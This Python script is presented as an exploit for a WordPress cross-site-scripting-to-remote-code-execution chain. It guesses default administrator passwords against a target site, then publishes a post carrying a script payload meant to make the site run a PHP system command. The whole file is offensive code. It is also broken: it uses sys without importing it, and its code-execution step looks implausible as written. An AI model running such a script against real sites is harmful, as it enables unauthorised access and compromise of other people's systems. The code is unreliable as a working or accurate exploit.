#!/usr/bin/env python3
"""
CVE-2024-31214 WordPress XSS to RCE Chain Exploit
"""
import requests
import random
import string

def generate_payload():
    """Generate XSS payload that triggers RCE"""
    payload = '''<script>
    fetch('/wp-admin/admin-ajax.php', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'action=upload_plugin&plugin_data=<?php system("whoami"); ?>'
    });
    </script>'''
    return payload

def test_xss_injection(target):
    """Test XSS vulnerability in comment section"""
    
    # First, create a test post
    session = requests.Session()
    
    # Try default credentials
    creds = [
        ('admin', 'admin'),
        ('admin', 'password'),
        ('admin', 'admin123')
    ]
    
    for username, password in creds:
        login_data = {
            'log': username,
            'pwd': password,
            'wp-submit': 'Log In'
        }
        
        try:
            response = session.post(
                f"{target}/wp-login.php",
                data=login_data,
                verify=False
            )
            
            if 'dashboard' in response.url:
                print(f"[+] Logged in with {username}:{password}")
                
                # Create post with XSS
                xss_payload = generate_payload()
                post_data = {
                    'post_title': 'Test Post',
                    'content': xss_payload,
                    'publish': 'Publish'
                }
                
                response = session.post(
                    f"{target}/wp-admin/post.php",
                    data=post_data,
                    verify=False
                )
                
                if response.status_code == 200:
                    print("[+] XSS payload injected via post")
                    return True
                    
        except Exception as e:
            continue
    
    return False

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 cve-2024-31214.py http://wordpress-site.com")
        sys.exit(1)
    
    target = sys.argv[1]
    test_xss_injection(target)
